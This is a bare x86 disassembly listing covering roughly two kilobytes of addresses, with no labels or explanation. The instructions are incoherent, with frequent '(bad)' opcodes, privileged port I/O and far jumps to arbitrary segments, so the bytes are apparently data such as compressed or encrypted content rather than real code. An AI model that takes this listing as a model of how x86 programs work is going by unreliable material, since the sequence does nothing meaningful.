  4502de:	test   eax,0xccd5887a
  4502e3:	lahf   
  4502e4:	outs   dx,DWORD PTR ds:[esi]
  4502e5:	or     eax,0x34b7323
  4502ea:	jmp    0xc76c:0x242304f5
  4502f1:	mov    ebx,DWORD PTR [edi]
  4502f3:	stc    
  4502f4:	std    
  4502f5:	or     edi,edx
  4502f7:	pop    esp
  4502f8:	scas   al,BYTE PTR es:[edi]
  4502f9:	dec    edx
  4502fa:	icebp  
  4502fb:	aad    0x7d
  4502fd:	sar    BYTE PTR [ebx],0x83
  450300:	into   
  450301:	mov    edx,0xef865647
  450306:	test   eax,0x1f25c95e
  45030b:	sar    esi,cl
  45030d:	cmp    ecx,DWORD PTR [ecx+edx*8]
  450310:	push   cs
  450311:	xor    ah,dl
  450313:	inc    ebx
  450314:	nop
  450315:	add    BYTE PTR [ecx+0x23af634],cl
  45031b:	lahf   
  45031c:	mov    edi,esp
  45031e:	cld    
  45031f:	xchg   edi,eax
  450320:	pop    ds
  450321:	sbb    BYTE PTR [edi],ah
  450323:	jg     0x4502fe
  450325:	add    eax,0xee79cc30
  45032a:	icebp  
  45032b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  45032c:	hlt    
  45032d:	leave  
  45032e:	pusha  
  45032f:	add    esp,DWORD PTR [ecx+0x77]
  450332:	cmp    al,0x69
  450334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450335:	test   eax,0xd0ba8847
  45033a:	add    dl,ah
  45033c:	ret    
  45033d:	in     eax,0x86
  45033f:	pop    ebp
  450340:	lods   al,BYTE PTR ds:[esi]
  450341:	sub    al,0x60
  450343:	stos   DWORD PTR es:[edi],eax
  450344:	jmp    0x450344
  450346:	xchg   DWORD PTR [edi+edx*1+0x66],edi
  45034a:	cs jmp 0x4502d3
  45034d:	add    dh,BYTE PTR [eax]
  45034f:	sub    DWORD PTR [eax],esi
  450351:	and    dh,bh
  450353:	sbb    DWORD PTR [esi+eax*2+0x1693c761],esp
  45035a:	dec    edi
  45035b:	mov    ds,WORD PTR [eax]
  45035d:	pushf  
  45035e:	fdivr  DWORD PTR [esi+0x64]
  450361:	add    bh,BYTE PTR [esi+0x66]
  450364:	pop    es
  450365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450366:	pop    ds
  450367:	pusha  
  450368:	lahf   
  450369:	mov    bl,0x71
  45036b:	and    ebp,ecx
  45036d:	dec    edx
  45036e:	imul   edx,ebp,0xffffffd3
  450371:	ret    0x354a
  450374:	test   BYTE PTR [eax],0x9a
  450377:	stc    
  450378:	jno    0x4503f2
  45037a:	inc    ebp
  45037b:	rcr    DWORD PTR [eax-0x26],0xca
  45037f:	dec    ebx
  450380:	mov    esi,DWORD PTR [ebp+0x6e97fec4]
  450386:	sbb    dl,BYTE PTR [ebx-0x6a12a617]
  45038c:	pop    eax
  45038d:	fwait
  45038e:	repnz aam 0x9d
  450391:	ins    BYTE PTR es:[edi],dx
  450392:	jecxz  0x4503f2
  450394:	push   edx
  450395:	cmc    
  450396:	sti    
  450397:	outs   dx,DWORD PTR ds:[esi]
  450398:	(bad)
  45039c:	jne    0x4503b1
  45039e:	push   ss
  45039f:	mov    ah,0x84
  4503a1:	cwde   
  4503a2:	pusha  
  4503a3:	aam    0x73
  4503a5:	(bad)  
  4503a6:	mov    al,ds:0x65b7c1f6
  4503ab:	cmp    al,0xae
  4503ad:	(bad)  
  4503af:	adc    ecx,DWORD PTR [eax+0x693aa7d]
  4503b5:	std    
  4503b6:	imul   edx,esp,0xffffffd4
  4503b9:	push   esp
  4503ba:	pop    ebx
  4503bb:	imul   eax,DWORD PTR [eax-0x1c],0xcb88f4b2
  4503c2:	daa    
  4503c3:	sbb    edx,esi
  4503c5:	xor    eax,0x5dd1a82
  4503ca:	mov    ah,0x75
  4503cc:	xchg   esp,eax
  4503ce:	loope  0x4503e0
  4503d0:	aas    
  4503d1:	add    BYTE PTR [edi-0x692f9e91],ah
  4503d7:	aad    0x80
  4503d9:	popf   
  4503da:	not    al
  4503dc:	repnz arpl WORD PTR [edi],di
  4503df:	aam    0x1b
  4503e1:	mov    esp,ebp
  4503e3:	xchg   ebp,eax
  4503e4:	imul   eax,ecx,0xffffff8a
  4503e7:	test   BYTE PTR [eax+0x35b543cb],0xbc
  4503ee:	sbb    eax,0x8605edb6
  4503f3:	stos   DWORD PTR es:[edi],eax
  4503f4:	cmp    DWORD PTR [esi+0x31],esi
  4503f7:	arpl   WORD PTR [edx+esi*1+0x1f],bx
  4503fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4503fc:	push   cs
  4503fd:	repnz lea ecx,[edx-0x599a693a]
  450404:	mov    ch,0xaf
  450406:	mov    al,ch
  450408:	mov    DWORD PTR [esi-0x49],esp
  45040b:	std    
  45040c:	pop    ebp
  45040d:	int3   
  45040e:	pusha  
  45040f:	mov    bh,0xd4
  450411:	push   eax
  450412:	and    DWORD PTR [ebp+0x4f],ebx
  450415:	idiv   dl
  450417:	fst    DWORD PTR [esi+0x3f2cf21c]
  45041d:	mov    edx,0x72a8e2a3
  450422:	jne    0x4503d3
  450424:	mov    cl,0xa7
  450426:	push   edx
  450427:	dec    ecx
  450428:	or     BYTE PTR [ebp+0x4c],ah
  45042b:	fdivr  st(6),st
  45042d:	sbb    al,0xd1
  45042f:	aad    0x65
  450431:	jg     0x45045d
  450433:	into   
  450434:	xchg   edi,eax
  450435:	push   eax
  450436:	ss aad 0x8e
  450439:	std    
  45043a:	mov    eax,0x66874d99
  45043f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450440:	mov    ds:0xefd42960,al
  450445:	pop    ss
  450446:	pop    ebp
  450447:	and    al,0x31
  450449:	xor    eax,0xabf17e69
  45044e:	or     dl,dh
  450450:	ja     0x450493
  450452:	std    
  450453:	(bad)  
  450455:	xor    dh,BYTE PTR [ebx+0x7c27a715]
  45045b:	in     eax,0x3d
  45045d:	inc    esp
  45045e:	jp     0x4504b4
  450460:	adc    DWORD PTR [ecx],ecx
  450462:	xchg   edx,eax
  450463:	dec    ebx
  450464:	pop    es
  450465:	add    al,BYTE PTR [edx+0xb5e43d5]
  45046b:	stc    
  45046c:	push   eax
  45046d:	push   ecx
  45046e:	pop    ds
  45046f:	add    DWORD PTR [ecx+0x7c],ebp
  450472:	(bad)  
  450473:	das    
  450474:	mov    ah,0xa
  450476:	jo     0x45044c
  450478:	pop    ebx
  450479:	aad    0x9
  45047b:	mov    dh,0xf1
  45047d:	or     al,0x38
  45047f:	popf   
  450480:	mov    BYTE PTR [ecx],bh
  450482:	jbe    0x45049d
  450484:	fldenv [ecx]
  450486:	loopne 0x4504a8
  450488:	mov    bl,0x2
  45048a:	mov    BYTE PTR [ebp+edi*4+0x581b2996],ah
  450491:	mov    ds:0x2c297d0,al
  450496:	pop    edx
  450497:	ins    DWORD PTR es:[edi],dx
  450498:	(bad)  
  450499:	fcomp  QWORD PTR [ebx-0x6bfca5e0]
  45049f:	loop   0x450431
  4504a1:	push   edi
  4504a2:	fild   QWORD PTR [edi]
  4504a4:	adc    BYTE PTR [eax+0xb873c06],ch
  4504aa:	sub    eax,0xbe70086b
  4504af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4504b0:	xchg   esi,eax
  4504b1:	call   0x51f9:0x3276d21
  4504b8:	mov    dh,0x5
  4504ba:	push   cs
  4504bb:	ficomp DWORD PTR [edx+0x5b]
  4504be:	jbe    0x450497
  4504c0:	push   esi
  4504c1:	aas    
  4504c2:	hlt    
  4504c3:	pop    ebx
  4504c4:	mov    esi,esi
  4504c6:	repnz adc eax,0xa2fa0085
  4504cc:	xchg   ebx,eax
  4504cd:	out    dx,eax
  4504ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4504cf:	arpl   bx,cx
  4504d1:	repnz pop esi
  4504d3:	cli    
  4504d4:	repz not ebx
  4504d7:	stos   BYTE PTR es:[edi],al
  4504d8:	push   edi
  4504d9:	fst    QWORD PTR [edx]
  4504db:	ret    0xa8c8
  4504de:	aam    0x5
  4504e0:	aam    0x2
  4504e2:	fiadd  DWORD PTR [ecx-0x2b1b6cdb]
  4504e8:	gs js  0x45050a
  4504eb:	mov    eax,ds:0xa1b589ac
  4504f0:	jo     0x450533
  4504f2:	push   edx
  4504f3:	aam    0xf2
  4504f5:	mov    WORD PTR [ecx-0x57],es
  4504f8:	xlat   BYTE PTR ds:[ebx]
  4504f9:	mov    ebp,0x41893687
  4504fe:	xor    bh,BYTE PTR [edi+eax*4]
  450501:	das    
  450502:	scas   eax,DWORD PTR es:[edi]
  450503:	jecxz  0x45050e
  450505:	push   ds
  450506:	mov    fs,WORD PTR ds:0xd9e1b51a
  45050c:	dec    ecx
  45050d:	jb     0x4504ef
  45050f:	lock mov DWORD PTR [ebx],ebx
  450512:	cwde   
  450513:	cmp    ch,BYTE PTR [ebp+0x6429ce6e]
  450519:	jecxz  0x4504eb
  45051b:	mov    eax,0x679fea9e
  450520:	enter  0xf0ab,0xa0
  450524:	pop    esi
  450525:	sahf   
  450526:	popa   
  450527:	jmp    0x2d561b4a
  45052c:	into   
  45052d:	mov    al,ds:0x75c75cf7
  450532:	mov    al,ds:0x5eaa8935
  450537:	lods   al,BYTE PTR ds:[esi]
  450538:	push   0x8e585bd0
  45053d:	imul   edi,DWORD PTR [ecx+0x7d],0xfffffff7
  450541:	aaa    
  450542:	cmp    edx,DWORD PTR [edi-0x500659e4]
  450548:	cmp    eax,0xe6f1c213
  45054d:	add    eax,0x167eff3f
  450552:	pop    esi
  450553:	dec    esp
  450554:	fs jmp 0x99fed0ba
  45055a:	push   esp
  45055b:	pop    edi
  45055c:	mov    dl,0x56
  45055e:	push   esp
  45055f:	aad    0x54
  450561:	mov    ebp,0xd5c7b4ef
  450566:	mov    DWORD PTR [eax+0x2b9d2588],0x9d171e91
  450570:	rol    BYTE PTR [edx],1
  450572:	dec    eax
  450573:	mov    dh,0x4b
  450575:	or     BYTE PTR [ecx+0x61efeea3],dl
  45057b:	mov    ebp,0xc1141b64
  450580:	and    bh,BYTE PTR [esi-0x12]
  450583:	fcomp  DWORD PTR ds:0x4df43002
  450589:	push   es
  45058a:	or     DWORD PTR [edi-0x15],ebx
  45058d:	push   ebp
  45058e:	pop    ebp
  45058f:	ins    DWORD PTR es:[edi],dx
  450590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450591:	jbe    0x4505b1
  450593:	push   edi
  450594:	and    DWORD PTR [edi+0x235c970],ebx
  45059a:	pop    edx
  45059b:	lahf   
  45059c:	mov    al,ds:0xfcac973f
  4505a1:	push   eax
  4505a2:	ds retf 
  4505a4:	popa   
  4505a5:	mov    ebp,0x9436a160
  4505aa:	fs pushf 
  4505ac:	fnclex 
  4505ae:	xor    ecx,DWORD PTR [ebp+0x9]
  4505b1:	mov    ds:0x3ed9adf8,al
  4505b6:	push   ebp
  4505b7:	leave  
  4505b8:	mov    DWORD PTR [ebx],edx
  4505ba:	cs jmp 0xde5c:0x7d9a5637
  4505c2:	bound  ebp,QWORD PTR [ebx+0x187a72b0]
  4505c8:	aad    0x62
  4505ca:	cld    
  4505cb:	adc    DWORD PTR [ecx],0xffffff88
  4505ce:	fs in  eax,dx
  4505d0:	jnp    0x450648
  4505d2:	mov    esp,0x89426c6a
  4505d7:	jl     0x450649
  4505d9:	sub    DWORD PTR [ecx+0x90be2d4],edi
  4505df:	mov    edi,0x1a0cde49
  4505e4:	std    
  4505e5:	retf   
  4505e6:	jl     0x4505bc
  4505e8:	jo     0x450612
  4505ea:	pushf  
  4505eb:	fstp   DWORD PTR [esi]
  4505ed:	mov    WORD PTR [ecx-0x30c6de2c],fs
  4505f3:	or     DWORD PTR [esi],esi
  4505f5:	icebp  
  4505f6:	out    dx,eax
  4505f7:	mov    BYTE PTR [edx+0x27ef4fb3],0x27
  4505fe:	pop    ds
  4505ff:	popf   
  450600:	xlat   BYTE PTR ds:[ebx]
  450601:	push   ecx
  450602:	test   DWORD PTR [edi-0x22],ebx
  450605:	add    ch,BYTE PTR [esi]
  450607:	sub    ebx,DWORD PTR [edi-0x7e3bd466]
  45060d:	and    al,0x1f
  45060f:	cvttps2pi mm2,QWORD PTR [ecx-0x59354af2]
  450616:	add    eax,0x44ce2dd4
  45061b:	mov    bh,0xb1
  45061d:	pop    ebx
  45061e:	xchg   esp,eax
  45061f:	pop    edx
  450620:	xchg   BYTE PTR [ebp-0x2ec79481],ah
  450626:	pop    ds
  450627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450628:	push   es
  450629:	cli    
  45062a:	sub    ebx,ebx
  45062c:	mov    WORD PTR [eax+eax*1],ss
  45062f:	loopne 0x450622
  450631:	sub    al,0xda
  450633:	xor    eax,0xf921d935
  450638:	xchg   esp,eax
  450639:	cmc    
  45063a:	call   0x7dc7f241
  45063f:	sbb    DWORD PTR [edi+ebp*4],0xffffffbd
  450643:	aam    0x2c
  450645:	dec    ebx
  450646:	or     dl,ch
  450648:	jge    0x45064a
  45064a:	mov    ah,0xe
  45064c:	mov    bl,cl
  45064e:	popf   
  45064f:	mov    al,0x8d
  450651:	adc    eax,0x3619fbb
  450656:	jb     0x450609
  450658:	out    0x2f,al
  45065a:	aad    0xbb
  45065c:	dec    edi
  45065d:	ret    0x2f1f
  450660:	ret    
  450661:	shr    BYTE PTR [edx+0x5e],cl
  450664:	push   ss
  450665:	jmp    0x4506d6
  450667:	aam    0x5b
  450669:	mov    dh,0x5a
  45066b:	mov    esp,0xbacd8b08
  450670:	mov    esi,DWORD PTR [ecx+0x63b16c54]
  450676:	jae    0x4506e1
  450678:	or     BYTE PTR [eax-0x6d],bl
  45067b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  45067c:	rol    BYTE PTR ds:0x64ae91b6,cl
  450682:	sti    
  450683:	lods   al,BYTE PTR ds:[esi]
  450684:	es xchg ecx,eax
  450686:	iret   
  450687:	das    
  450688:	test   DWORD PTR [esp+eax*8+0x62],eax
  45068c:	cmovns edi,DWORD PTR [ebp+0x6b]
  450690:	popa   
  450691:	jecxz  0x4506cd
  450693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450694:	cs and dl,cl
  450697:	aam    0xa4
  450699:	int3   
  45069a:	xor    al,0xf2
  45069c:	jmp    0x450669
  45069e:	sbb    BYTE PTR [eax-0x78],al
  4506a1:	popa   
  4506a2:	test   DWORD PTR ds:0x3f720705,eax
  4506a8:	ins    BYTE PTR es:[edi],dx
  4506a9:	add    esi,DWORD PTR [eax-0x6c]
  4506ac:	push   ebp
  4506ad:	mov    ds:0x43f50237,eax
  4506b2:	or     al,0x50
  4506b4:	mov    ebp,ecx
  4506b6:	in     al,0x6
  4506b8:	push   edi
  4506b9:	mov    cl,0xf6
  4506bb:	in     al,0xec
  4506bd:	add    cl,BYTE PTR [ebp+edx*2+0x400e8150]
  4506c4:	fidiv  WORD PTR [ebx]
  4506c6:	push   ds
  4506c7:	test   eax,0xa3acc039
  4506cc:	mov    dl,0xb4
  4506ce:	sti    
  4506cf:	mov    BYTE PTR [esi],ch
  4506d1:	jb     0x4506da
  4506d3:	aam    0xe1
  4506d5:	mov    al,0xc8
  4506d7:	mov    ah,0x13
  4506d9:	xor    BYTE PTR [edi],bl
  4506db:	mov    eax,ds:0xe81710b
  4506e0:	shr    BYTE PTR [ecx+0x37],1
  4506e3:	xlat   BYTE PTR ds:[ebx]
  4506e4:	mov    edx,0xfe22c9df
  4506e9:	cmp    DWORD PTR [ebx],0xffffffda
  4506ec:	mov    DWORD PTR [edi-0x33e2e04e],eax
  4506f2:	das    
  4506f3:	scas   al,BYTE PTR es:[edi]
  4506f4:	add    eax,0xd2146c2f
  4506f9:	hlt    
  4506fa:	rcl    ah,cl
  4506fc:	jno    0x450744
  4506fe:	in     al,0x7a
  450700:	aam    0x3d
  450702:	jnp    0x4506c3
  450704:	add    ecx,esi
  450706:	in     eax,dx
  450707:	push   ecx
  450708:	dec    ecx
  450709:	out    dx,al
  45070a:	ficom  WORD PTR [esi+eiz*2+0x3e]
  45070e:	pop    ebx
  45070f:	xlat   BYTE PTR ds:[ebx]
  450710:	(bad)  
  450711:	fsubr  QWORD PTR [esi+0x3cb32960]
  450717:	std    
  450718:	jmp    0xdeca4b15
  45071d:	add    BYTE PTR [eax-0x3b],ah
  450720:	adc    ebp,esp
  450722:	push   esp
  450723:	pop    ebx
  450724:	and    DWORD PTR [ebx],eax
  450726:	mov    edi,0xe447e1b5
  45072b:	ror    edx,cl
  45072d:	mov    ah,BYTE PTR ds:0xc86b897b
  450733:	lods   al,BYTE PTR ds:[esi]
  450734:	sahf   
  450735:	xor    ch,bh
  450737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450738:	mov    BYTE PTR [edi],dh
  45073a:	js     0x450773
  45073c:	add    cl,al
  45073e:	gs mov bl,0x70
  450741:	inc    ebp
  450742:	jle    0x4507a9
  450744:	push   0x3
  450746:	add    al,0x97
  450748:	(bad)  
  450749:	lahf   
  45074a:	cmp    DWORD PTR [edx+0x5ffdf5fb],ebx
  450750:	adc    esp,DWORD PTR [esi]
  450752:	push   cs
  450753:	sti    
  450754:	in     eax,dx
  450755:	(bad)
  450758:	fsubp  st(2),st
  45075a:	in     eax,dx
  45075b:	aam    0xd7
  45075d:	dec    edx
  45075e:	cmc    
  45075f:	bound  esp,QWORD PTR [eax+0x32]
  450762:	leave  
  450763:	or     BYTE PTR [edi+ecx*4+0x3ff942af],al
  45076a:	iret   
  45076b:	fcmovu st,st(1)
  45076d:	daa    
  45076e:	(bad)  
  45076f:	xchg   edi,eax
  450770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450771:	dec    edi
  450772:	(bad)  
  450774:	mov    edi,0xfa36788d
  450779:	gs aam 0xd5
  45077c:	xor    BYTE PTR [edi-0x1c99dd31],ch
  450782:	das    
  450783:	xlat   BYTE PTR ds:[ebx]
  450784:	ss mov cl,0x63
  450787:	add    DWORD PTR [ecx+0x63],ebp
  45078a:	ins    DWORD PTR es:[edi],dx
  45078b:	popa   
  45078c:	mov    DWORD PTR [ecx],ebx
  45078e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  45078f:	pushf  
  450790:	dec    edx
  450791:	sub    DWORD PTR [eax+0x52022ac8],esi
  450797:	lds    eax,FWORD PTR [eax+esi*4]
  45079a:	(bad)  
  45079b:	in     al,dx
  45079c:	out    dx,al
  45079d:	and    al,0x5
  45079f:	ror    BYTE PTR [ecx+0x64c1d38f],0xf0
  4507a6:	ss xor al,0x34
  4507a9:	add    esp,eax
  4507ab:	icebp  
  4507ac:	adc    eax,0xca32f639
  4507b1:	stos   DWORD PTR es:[edi],eax
  4507b2:	not    DWORD PTR [ebp+0x587402cf]
  4507b8:	mov    al,0xe6
  4507ba:	sub    esi,edi
  4507bc:	jg     0x4507db
  4507be:	mov    esi,0x5158beaa
  4507c3:	xor    al,0xf3
  4507c5:	cmp    BYTE PTR [esi+0x24],0x4c
  4507c9:	repz pop ds
  4507cb:	add    edi,ebx
  4507cd:	push   es
  4507ce:	in     al,0x67
  4507d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4507d1:	mov    al,ds:0x88919cab
  4507d6:	mov    esi,0x6cb32bd6
  4507db:	jl     0x4507ac
  4507dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4507de:	not    BYTE PTR [edi-0x3c]
  4507e1:	mov    ebp,0xe5892f15
  4507e6:	xchg   esi,eax
  4507e7:	scas   eax,DWORD PTR es:[edi]
  4507e8:	int3   
  4507e9:	stos   BYTE PTR es:[edi],al
  4507ea:	push   ebx
  4507eb:	aad    0xdf
  4507ed:	lock call 0x18ec:0x5a9efb7a
  4507f5:	add    al,0x1d
  4507f7:	aam    0x15
  4507f9:	ss lods al,BYTE PTR fs:[esi]
  4507fc:	int3   
  4507fd:	mov    al,ds:0xc706d403
  450802:	(bad)  
  450803:	in     eax,0x82
  450805:	fist   WORD PTR [esi+0x11a7ad52]
  45080b:	fmul   QWORD PTR [ecx-0x31c8ff4d]
  450811:	shl    DWORD PTR [edi+0x52570cd5],cl
  450817:	les    eax,FWORD PTR [esi+0x34]
  45081a:	jo     0x4507e7
  45081c:	mov    BYTE PTR [ebp+0x76cb191d],bh
  450822:	adc    edi,esp
  450824:	sbb    DWORD PTR [edx],eax
  450826:	pop    esp
  450827:	movlps xmm5,QWORD PTR [ebx+ecx*8-0x43]
  45082c:	adc    dl,ah
  45082e:	pusha  
  45082f:	jg     0x4507f2
  450831:	inc    eax
  450832:	mov    ?,WORD PTR [eax+esi*1-0x6663376b]
  450839:	sbb    DWORD PTR [edx-0x366310ac],0x9c642e14
  450843:	adc    eax,0x94d402bc
  450848:	aam    0x42
  45084a:	outs   dx,DWORD PTR ds:[esi]
  45084b:	daa    
  45084c:	test   eax,0x2643ee02
  450851:	pop    edi
  450852:	mov    ebp,0x1f518588
  450857:	mov    esp,DWORD PTR ds:0x342d71e4
  45085d:	repnz dec esi
  45085f:	aad    0xcd
  450861:	scas   eax,DWORD PTR es:[edi]
  450862:	in     eax,dx
  450863:	aas    
  450864:	mov    ah,0x7
  450866:	jbe    0x4508c4
  450868:	mov    bl,cl
  45086a:	cmp    edx,DWORD PTR ds:[edi-0x1170a6e5]
  450871:	add    eax,0xaa44ca30
  450876:	test   BYTE PTR [esi+esi*1-0x2],dh
  45087a:	fs mov bl,0x11
  45087d:	pop    edx
  45087e:	arpl   WORD PTR [esi-0x1297d19],ax
  450884:	test   DWORD PTR [esi],esp
  450886:	push   esi
  450887:	(bad)  
  450888:	lea    edi,[ecx+0x21]
  45088b:	ss dec edx
  45088d:	xchg   esi,eax
  45088e:	sbb    eax,0x60ed6624
  450893:	xchg   ebx,eax
  450894:	in     eax,dx
  450895:	adc    bl,BYTE PTR [ecx+0x5901a801]
  45089b:	aam    0x80
  45089d:	push   0x52fd329e
  4508a2:	mov    esp,0xbef8970
  4508a7:	fisubr DWORD PTR [ecx-0x259c06cc]
  4508ad:	adc    al,0xa6
  4508af:	sbb    ecx,eax
  4508b1:	fprem  
  4508b3:	adc    eax,0xac96ec94
  4508b8:	xchg   ebp,eax
  4508b9:	in     eax,dx
  4508ba:	jb     0x450913
  4508bc:	push   esi
  4508bd:	ret    
  4508be:	and    al,BYTE PTR [ebx-0x2a286b34]
  4508c4:	add    al,0x31
  4508c6:	sahf   
  4508c7:	push   cs
  4508c8:	inc    esi
  4508c9:	imul   eax,DWORD PTR [ebx-0x72a676c6],0x7b
  4508d0:	sub    al,0x7a
  4508d2:	out    dx,al
  4508d3:	add    al,0xc5
  4508d5:	add    eax,0xe27e6a10
  4508da:	stos   BYTE PTR es:[edi],al
  4508db:	sbb    eax,DWORD PTR [esi]
  4508dd:	xor    ch,BYTE PTR [ebp+ebx*2-0x59]
  4508e1:	test   DWORD PTR [eax],ebp
  4508e3:	jo     0x4508ed
  4508e5:	stc    
  4508e6:	aas    
  4508e7:	sbb    al,0xae
  4508e9:	jne    0x450901
  4508eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4508ec:	mov    ch,al
  4508ee:	mov    esp,0x1c2476e2
  4508f3:	add    eax,0x887681f7
  4508f8:	sub    al,BYTE PTR [ebx-0x23f666a0]
  4508fe:	push   ss
  4508ff:	push   ebx
  450900:	pushf  
  450901:	shr    DWORD PTR [ebp+edx*8+0x14],1
  450905:	push   ds
  450906:	xor    bl,al
  450908:	lods   al,BYTE PTR ds:[esi]
  450909:	xchg   esp,eax
  45090a:	dec    ecx
  45090b:	ins    BYTE PTR es:[edi],dx
  45090c:	mov    BYTE PTR [ebx+0x56],dh
  45090f:	stos   BYTE PTR es:[edi],al
  450910:	les    esp,FWORD PTR [esi+0x5e498d2]
  450916:	je     0x4508af
  450918:	xchg   edi,eax
  450919:	push   esp
  45091a:	add    al,0x63
  45091c:	mov    esi,0xca911f3c
  450921:	call   0x68e3139f
  450926:	test   eax,0xeef87ad5
  45092b:	cli    
  45092c:	jnp    0x45099b
  45092e:	jnp    0x450997
  450930:	shl    DWORD PTR gs:[eax-0x4f],1
  450934:	(bad)
  450938:	lock jg 0x450993
  45093b:	mov    ebx,0xaaad71fd
  450940:	mov    DWORD PTR [ebx+0x2a60fd3e],edx
  450946:	ins    BYTE PTR es:[edi],dx
  450947:	xchg   ebx,eax
  450948:	xchg   esi,eax
  450949:	inc    edi
  45094a:	fs enter 0x888b,0x3
  45094f:	mov    ebx,DWORD PTR [ecx]
  450951:	xchg   ebx,eax
  450952:	std    
  450953:	mov    BYTE PTR [esi],0x12
  450956:	inc    eax
  450957:	lea    esi,[edi+0x58]
  45095a:	popf   
  45095b:	fwait
  45095c:	jmp    0x7438477
  450961:	in     eax,dx
  450962:	mov    edx,0x9e6ad9d5
  450967:	lods   al,BYTE PTR ds:[esi]
  450968:	(bad)  
  45096a:	add    BYTE PTR [esi+0x6b],dl
  45096d:	jno    0x450945
  45096f:	push   esi
  450970:	mov    cs,WORD PTR [ebx+0x2e]
  450973:	aad    0x51
  450975:	scas   al,BYTE PTR es:[di]
  450977:	sahf   
  450978:	and    eax,0xad1f1f71
  45097d:	mov    ?,WORD PTR [edi-0x1ed12d82]
  450983:	aad    0x5a
  450985:	adc    BYTE PTR [esi],0x4a
  450988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  45098a:	das    
  45098b:	inc    edx
  45098c:	mov    DWORD PTR [ebp-0x6130443f],ebx
  450992:	xchg   ebp,eax
  450993:	inc    edi
  450994:	sub    eax,0x89566601
  450999:	push   esp
  45099a:	and    al,0xde
  45099c:	js     0x450959
  45099e:	pop    esp
  45099f:	mov    ds:0x84caab88,al
  4509a4:	ret    
  4509a5:	push   ds
  4509a6:	mul    DWORD PTR [eax]
  4509a8:	clc    
  4509a9:	add    ch,BYTE PTR [ebx+edx*4+0x3f]
  4509ad:	call   0x774b15a1
  4509b2:	daa    
  4509b3:	push   ebp
  4509b4:	mov    DWORD PTR [ebx],edx
  4509b6:	adc    al,bh
  4509b8:	in     eax,dx
  4509b9:	scas   eax,DWORD PTR es:[edi]
  4509ba:	mov    edx,0x24498494
  4509bf:	std    
  4509c0:	out    0x85,eax
  4509c2:	mov    ch,0x60
  4509c4:	aas    
  4509c5:	pop    ecx
  4509c6:	inc    ebx
  4509c7:	adc    eax,0xbf02fd8e
  4509cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4509cd:	(bad)  
  4509ce:	mov    ecx,0x8f842225
  4509d3:	scas   al,BYTE PTR es:[edi]
  4509d4:	jg     0x4509f3
  4509d6:	ins    DWORD PTR es:[edi],dx
  4509d7:	aas    
  4509d8:	int    0x2
  4509da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4509db:	call   0xc389:0xcb983729
  4509e2:	rol    DWORD PTR [eax+esi*4],cl
  4509e5:	lea    ebx,[eax]
  4509e7:	lods   al,BYTE PTR ds:[esi]
  4509e8:	clc    
  4509e9:	add    al,BYTE PTR [eax-0x6d]
  4509ec:	daa    
  4509ed:	retf   0xfe45
  4509f0:	lods   al,BYTE PTR ds:[esi]
  4509f1:	icebp  
  4509f2:	pusha  
  4509f3:	out    0xfb,eax
  4509f5:	add    ah,cl
  4509f7:	ss dec eax
  4509f9:	or     al,BYTE PTR [ecx]
  4509fb:	aam    0x44
  4509fd:	mov    esi,0x6ac471d5
  450a02:	shl    DWORD PTR [ecx*4-0x54a7b3f7],0x64
  450a0a:	aad    0x54
  450a0c:	bound  ebx,QWORD PTR [edi-0x7e907a6c]
  450a12:	xor    bl,BYTE PTR [eax]
  450a14:	jno    0x450a94
  450a16:	and    DWORD PTR gs:[ebp-0x40685a71],ebx
  450a1d:	lock fmul QWORD PTR [eax+ebp*8+0x1d]
  450a22:	inc    ebp
  450a23:	aam    0x26
  450a25:	repnz enter 0xd053,0x6c
  450a2a:	xor    ecx,ebx
  450a2c:	mov    BYTE PTR [ecx-0x4541c80f],bh
  450a32:	and    al,0x93
  450a34:	mov    edx,0x43d0c202
  450a39:	mov    BYTE PTR [edi+0x1fa59e7a],al
  450a3f:	mov    edi,0x4ee40937
  450a44:	cwde   
  450a45:	je     0x4509ce
  450a47:	aad    0xf5
  450a49:	sbb    eax,0xd86483a8
  450a4e:	(bad)  
  450a4f:	xchg   ecx,eax
  450a50:	mov    edi,edx
  450a52:	(bad)  
  450a53:	pushf  
  450a54:	xor    ecx,DWORD PTR [edi+0x7d]
  450a57:	inc    edx
  450a58:	push   ecx
  450a59:	add    eax,esp
  450a5b:	pop    ecx
  450a5c:	fwait
  450a5d:	lea    edi,[esi-0x3f]
  450a60:	addr16 pop ecx
  450a62:	push   ds
  450a63:	adc    edi,ebx
  450a65:	pop    ebx
  450a66:	sub    esp,DWORD PTR [edi]
  450a68:	pop    eax
  450a69:	cli    
  450a6a:	push   ds
  450a6b:	mov    ds:0xaeb455ba,eax
  450a70:	add    ecx,DWORD PTR es:[edx+0x46d55846]
  450a77:	inc    eax
  450a78:	xchg   ebp,eax
  450a79:	xor    ecx,ebx
  450a7b:	lods   al,BYTE PTR ds:[esi]
  450a7c:	cs ret 0x4cb9
  450a80:	and    DWORD PTR [esi],esi
  450a82:	cmovno ebp,DWORD PTR [edx-0x2121e0b9]
  450a89:	inc    ebx
  450a8a:	(bad)  
  450a8b:	ss push ecx
  450a8d:	push   ebx
  450a8e:	pop    ecx
  450a8f:	and    eax,DWORD PTR [ebp+0x4aa9e71]
  450a95:	mov    WORD PTR [edi+0x10021a1f],es
  450a9b:	aad    0xb6
